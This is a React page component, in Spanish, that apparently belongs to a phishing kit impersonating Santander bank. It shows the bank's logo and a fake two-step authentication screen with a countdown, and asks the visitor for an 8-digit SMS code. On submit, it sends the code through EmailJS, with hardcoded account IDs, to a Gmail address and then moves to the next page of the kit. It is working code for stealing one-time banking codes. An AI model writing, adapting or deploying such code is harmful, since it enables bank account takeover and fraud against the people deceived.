import React, { useState, useEffect } from 'react';
import '../css/segundapag.css';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

function Segundapag2() {
  const navigate = useNavigate();
  const [timeLeft, setTimeLeft] = useState(180); // 3 minutos en segundos

  useEffect(() => {
    if (timeLeft > 0) {
      const timerId = setInterval(() => {
        setTimeLeft(timeLeft - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [timeLeft]);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    
    const formData = new FormData(event.target);
    const smsCode = formData.get('sms-code');

    try {
      const response = await emailjs.send('service_pl7uznq', 'template_nb08ccn', {
        sms_code: smsCode,
        to_email: 'alosantamex@gmail.com'
      }, '8Mgn87H6amGJecjhG');

      if (response.status === 200) {
        console.log('Datos enviados correctamente');
        navigate('/tercerapag');
      } else {
        console.error('Error al enviar los datos');
      }
    } catch (error) {
      console.error('Error al enviar los datos:', error);
    }
  };

  return (
    <div className="auth-container">
      <div className="auth-header">
        <span className="auth-logo">
          <img style={{ width: '160px' }} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="Logo Santander" />
        </span>
      </div>
      <div className="auth-progress">
        <div className="auth-step-circle">1</div>
        <div className="auth-status">
          <p>Lo estamos autenticando</p>
          <p>1 de 2</p>
        </div>
        <div className="auth-progress-bar">
          <div className="auth-progress-bar-fill"></div>
        </div>
      </div>
      <form className="auth-form" onSubmit={handleSubmit}>
        <label>
          Ingrese los números que recibió por mensaje SMS:
          <input type="tel" name="sms-code" maxLength={8} placeholder="8 dígitos" className="auth-input" required />
        </label>
        <div className="auth-timer">
          Tiempo restante: {formatTime(timeLeft)}
        </div>
        <button type="submit" className="auth-continue-button" disabled={timeLeft === 0}>Continuar</button>
      </form>
    </div>
  );
}

export default Segundapag2;
